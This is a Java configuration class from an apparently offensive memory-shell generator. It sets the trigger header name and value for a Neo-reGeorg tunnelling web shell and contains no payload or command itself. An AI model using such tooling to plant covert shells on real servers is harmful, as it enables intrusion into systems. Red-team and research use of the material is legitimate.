package com.reajason.javaweb.memshell.config;

import com.reajason.javaweb.utils.CommonUtil;
import lombok.*;
import lombok.experimental.SuperBuilder;
import org.apache.commons.lang3.StringUtils;

/**
 * @author ReaJason
 * @since 2025/2/28
 */
@Getter
@SuperBuilder
@NoArgsConstructor
@AllArgsConstructor
@ToString
public class NeoreGeorgConfig extends ShellToolConfig {
    @Builder.Default
    private String headerName = "Referer";
    @Builder.Default
    private String headerValue = CommonUtil.getRandomString(8);

    public static abstract class NeoreGeorgConfigBuilder<C extends NeoreGeorgConfig, B extends NeoreGeorgConfig.NeoreGeorgConfigBuilder<C, B>>
            extends ShellToolConfig.ShellToolConfigBuilder<C, B> {

        public B headerName(String headerName) {
            if (StringUtils.isNotBlank(headerName)) {
                this.headerName(headerName);
            }
            return self();
        }

        public B headerValue(String headerValue) {
            if (StringUtils.isNotBlank(headerValue)) {
                this.headerValue(headerValue);
            }
            return self();
        }
    }
}